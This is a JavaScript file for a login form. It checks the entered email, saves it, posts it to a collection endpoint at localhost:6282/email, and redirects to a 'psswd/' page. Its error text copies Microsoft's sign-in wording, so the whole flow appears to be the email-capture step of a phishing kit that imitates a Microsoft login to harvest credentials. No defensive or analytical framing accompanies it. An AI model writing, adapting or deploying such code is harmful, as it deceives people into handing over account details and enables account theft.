window.addEventListener('load', function() {
  const API_URL = 'http://localhost:6282';
  const inputElement = document.getElementById('textInput');
  const errorText = document.getElementById('errorText');

  const sendData = (data) => fetch(`${API_URL}/email`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  });

  const submitForm = () => {
    const enteredText = inputElement.value;

    if (enteredText.trim() === '') {
      errorText.textContent = 'Enter a valid email address, phone number, or Skype name.';
      errorText.style.display = 'block';
      inputElement.classList.add('error_gpt');
    } else {
      const pattern = /^[a-zA-Z0-9]{8,}@.*\.com$/;

      if (!pattern.test(enteredText)) {
        errorText.textContent = 'Enter a valid email address, phone number, or Skype name.';
        errorText.style.display = 'block';
        inputElement.classList.add('error_gpt');
      } else {
        errorText.style.display = 'none';
        inputElement.classList.remove('error_gpt');

        localStorage.setItem('inputText', enteredText);

        sendData({ email: enteredText })
          .then(response => {
            console.log('Data sent successfully', response);
            window.location.href = 'psswd/';
          })
          .catch(error => {
            console.error('Error sending data', error);
          });
      }
    }
  };

  const submitBtn = document.querySelector(".btn");
  const dataForm = document.getElementById("myForm");

  submitBtn.addEventListener("click", submitForm);

  dataForm.addEventListener("submit", function(event) {
    event.preventDefault();
    submitForm();
  });

  dataForm.addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
      event.preventDefault();
      submitForm();
    }
  });
});
